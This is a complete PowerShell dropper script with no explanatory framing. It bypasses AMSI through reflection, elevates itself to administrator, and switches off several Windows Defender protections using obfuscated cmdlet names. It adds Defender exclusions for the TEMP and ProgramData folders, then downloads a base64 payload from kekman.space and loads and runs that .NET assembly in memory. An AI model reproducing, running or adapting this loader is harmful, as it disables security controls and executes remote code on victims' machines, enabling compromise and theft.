# ---- AMSI BYPASS (obfuscated) ----
$am = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$am.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ---- Self-elevate ----
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    exit
}

# ---- Disable Defender (obfuscated) ----
$p1='Set-MpPref';$p2='erence';$cmd=$p1+$p2
$props=@('DisableRealtimeMonitoring','DisableIOAVProtection','DisableNetworkProtection','DisableBehaviorMonitoring','DisableBlockAtFirstSeen','DisableCloudProtection','DisableArchiveScanning','DisableScriptScanning')
foreach($prop in $props){& $cmd -$prop $true -Force}
$excl='Add-MpPref'+'erence'
& $excl -ExclusionPath "$env:TEMP" -Force
& $excl -ExclusionPath "$env:ProgramData" -Force

# ---- Download Base64 from server ----
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0')
$b64 = $wc.DownloadString('https://kekman.space/encoded.txt')
# Remove any whitespace/newlines
$b64 = $b64.Trim() -replace "`r`n", "" -replace "`n", "" -replace " ", ""

# ---- Decode and load assembly in memory ----
$bytes = [Convert]::FromBase64String($b64)
$asm = [System.Reflection.Assembly]::Load($bytes)
$entry = $asm.EntryPoint
if ($entry) {
    $params = $entry.GetParameters()
    if ($params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]) {
        $entry.Invoke($null, (, [string[]] @()))
    } else {
        $entry.Invoke($null, $null)
    }
} else {
    # fallback: find Main method
    $main = $asm.GetType('Program').GetMethod('Main', [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static)
    if ($main) { $main.Invoke($null, $null) }
}